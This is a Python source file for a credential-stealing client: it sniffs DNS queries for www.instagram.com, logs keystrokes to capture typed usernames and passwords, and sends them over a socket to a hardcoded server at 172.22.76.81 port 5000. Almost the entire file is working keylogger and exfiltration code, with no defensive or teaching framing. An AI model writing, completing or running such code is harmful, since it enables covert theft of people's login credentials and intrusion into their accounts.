import socket
import threading
import keyboard  # For keylogging 
from scapy.all import sniff, DNS , DNSQR  # For packet sniffing 
import time

# Server details
SERVER_HOST = "172.22.76.81"
SERVER_PORT = 5000
TARGET_WEBSITE = "www.instagram.com" 
start_time = time.time()
duration = 30

keylogger_active = False  # A flag which will command the keylogger that when to get activated

def keylogger(sock):
    """Logs keystrokes and sends them to the server."""
    username = ''
    password = ''
    is_password = False  # Flag to determine if we are capturing the password

    def on_key(event):
        nonlocal username, password, is_password

        if event.name == 'enter':  # If the user presses 'Enter', assume login submission
            # if is_password:
            print(f"Password detected: {password}")
            # Send the password to the server
            message = f"Password: {password} Username={username}".encode()
            sock.sendall(message)
            # else:
            print(f"Username detected: {username}")
            # Send the username to the server
            message = f"Username: {username}\n".encode()
            sock.sendall(message)

            # Reset for the next input
            username = ''
            password = ''
            is_password = False

        elif event.name == 'tab':  # Tab to switch from username to password
            is_password = True

        elif event.name == 'space':  # Handle spacebar (if part of the username)
            if is_password:
                password += ' '  # Add space to password
            else:
                username += ' '  # Add space to username

        elif event.name == 'backspace':  # Handle backspace
            if is_password and password:
                password = password[:-1]  # Remove last character from password
            elif username:
                username = username[:-1]  # Remove last character from username

        elif is_password:
            if len(event.name) == 1:  # Only append single characters (e.g., a-z, 0-9)
                password += event.name  # Append to password field
        else:
            if len(event.name) == 1:  # Only append single characters (e.g., a-z, 0-9)
                username += event.name  # Append to username field

    keyboard.on_press(on_key)  # Listen for key press events
    keyboard.wait()  # Wait indefinitely for key events

def packet_sniffer(sock, target_website):
    """Sniffs network packets to detect requests to the target website."""
    def process_packet(packet):
        global keylogger_active
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  # DNS Query
        # Extract the domain name from the DNS query
            domain = packet[DNSQR].qname.decode('utf-8')
            # print(date)
            print(f"Detected domain: {domain}")
            
            if target_website in domain:
                if not keylogger_active:
                    message = f"NOTIFY: {target_website} accessed. Activating keylogger".encode()
                    sock.sendall(message)
                    elapsed_time = time.time() - start_time
                    keylogger_active = True
                    if (elapsed_time > duration):
                        sock.close()

    # Start sniffing on all interfaces
    print("Starting packet sniffing...")
    sniff(prn=process_packet, store=False)

def main():
    """Main function to set up the client."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock:
        # Connect to the server
        client_sock.connect((SERVER_HOST, SERVER_PORT))
        print(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")

        if client_sock:
            sniffer_thread = threading.Thread(target=packet_sniffer,args=(client_sock,TARGET_WEBSITE),daemon=True)
            sniffer_thread.start()
            keylogger(client_sock)

if __name__ == "__main__":
    main()
